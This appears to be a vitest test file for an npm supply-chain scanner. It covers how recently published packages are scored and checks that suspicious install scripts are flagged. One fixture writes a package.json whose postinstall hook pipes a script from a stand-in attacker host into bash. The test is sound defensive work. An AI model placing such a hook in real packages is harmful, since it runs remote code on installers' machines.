import { describe, it, expect, vi } from "vitest";
import { mkdtemp, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import type { ScanConfig } from "../src/types.js";

// Stand in for `npm view` so the registry checks run offline and the publish
// date is under the test's control. Every other command fails, as it would
// with no network.
const registry = vi.hoisted(() => ({ daysAgo: 2 }));

vi.mock("node:child_process", () => ({
  execFile: (...args: unknown[]) => {
    const cb = args[args.length - 1] as (err: Error | null, out?: { stdout: string; stderr: string }) => void;
    const [cmd, cmdArgs] = args as [string, string[]];
    if (cmd === "npm" && cmdArgs[0] === "view") {
      const modified = new Date(Date.now() - registry.daysAgo * 86_400_000).toISOString();
      const metadata = {
        time: { modified },
        maintainers: [{ name: "a" }, { name: "b" }],
        description: "MCP server for knowledge-graph memory",
      };
      cb(null, { stdout: JSON.stringify(metadata), stderr: "" });
    } else {
      cb(new Error(`offline: ${cmd} ${cmdArgs.join(" ")}`));
    }
  },
}));

const { supplyChainScanner } = await import("../src/scanner/supply-chain.js");
const { runScan } = await import("../src/scanner/index.js");
const { formatTerminal } = await import("../src/reporter/terminal.js");

async function packageConfig(): Promise<ScanConfig> {
  const dir = await mkdtemp(join(tmpdir(), "shield-sc-"));
  return {
    targetPath: dir,
    targetIdentifier: "@modelcontextprotocol/server-memory",
    packageName: "@modelcontextprotocol/server-memory",
    mode: "package",
    quick: true,
    format: "terminal",
  };
}

describe("recently published package", () => {
  it("is reported as info, not high", async () => {
    registry.daysAgo = 2;
    const findings = await supplyChainScanner.run(await packageConfig(), { files: [], contents: new Map() });
    const recent = findings.find((f) => f.title === "Recently published package");
    expect(recent?.severity).toBe("info");
  });

  it("costs no score but still appears in the output", async () => {
    registry.daysAgo = 400;
    const old = await runScan(await packageConfig());
    registry.daysAgo = 2;
    const fresh = await runScan(await packageConfig());

    expect(old.findings.some((f) => f.title === "Recently published package")).toBe(false);
    expect(fresh.findings.some((f) => f.title === "Recently published package")).toBe(true);
    expect(fresh.score).toBe(old.score);
    expect(formatTerminal(fresh)).toContain("Recently published package");
  });
});

describe("install scripts", () => {
  // npm runs these on install, so they matter most in a package scan, which
  // is how you check a package before installing it.
  async function withPostinstall(config: ScanConfig): Promise<ScanConfig> {
    const pkgJson = { name: "x", repository: "github:x/x", scripts: { postinstall: "curl -s https://evil.example.com/p.sh | bash" } };
    await writeFile(join(config.targetPath, "package.json"), JSON.stringify(pkgJson), "utf-8");
    return config;
  }

  it("are checked on package scans", async () => {
    const result = await runScan(await withPostinstall(await packageConfig()));
    const hooks = result.findings.filter((f) => f.title === "Suspicious postinstall script");
    expect(hooks).toHaveLength(1);
    expect(hooks[0]?.severity).toBe("critical");
  });

  it("are reported once on local scans", async () => {
    const { packageName: _, ...local } = await withPostinstall(await packageConfig());
    const result = await runScan({ ...local, targetIdentifier: local.targetPath, mode: "local" });
    expect(result.findings.filter((f) => f.title === "Suspicious postinstall script")).toHaveLength(1);
  });
});
